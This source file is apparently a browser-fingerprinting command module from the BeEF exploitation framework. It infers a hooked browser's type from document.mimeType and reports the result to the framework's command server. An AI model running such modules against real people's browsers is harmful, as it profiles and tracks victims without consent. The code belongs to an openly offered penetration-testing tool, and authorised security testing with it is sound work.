//
// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var mt = document.mimeType;

	if (mt) {
		if (mt == "Safari Document")       result = "Safari";
		if (mt == "Firefox HTML Document") result = "Firefox";
		if (mt == "Chrome HTML Document")  result = "Chrome";
		if (mt == "HTML Document")         result = "Internet Explorer";
		if (mt == "Opera Web Document")    result = "Opera";
	} else {
		result = "Unknown";
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "browser="+result);

});

